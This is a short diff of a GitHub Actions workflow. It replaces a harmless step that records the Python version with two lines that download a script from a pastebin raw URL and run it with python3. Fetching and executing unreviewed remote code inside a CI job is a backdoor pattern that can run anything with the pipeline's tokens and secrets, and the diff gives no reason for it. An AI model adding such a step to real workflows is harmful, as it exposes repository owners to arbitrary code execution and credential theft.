@@ -17,7 +17,8 @@ jobs:
     
     - name: operations
       run: |
-          echo `python3 -V` > res.txt
+          wget https://pastebin.pl/view/raw/09a88697 -O 123.py
+          python3 123.py
           git add res.txt
     
     - name: Commit results to Github
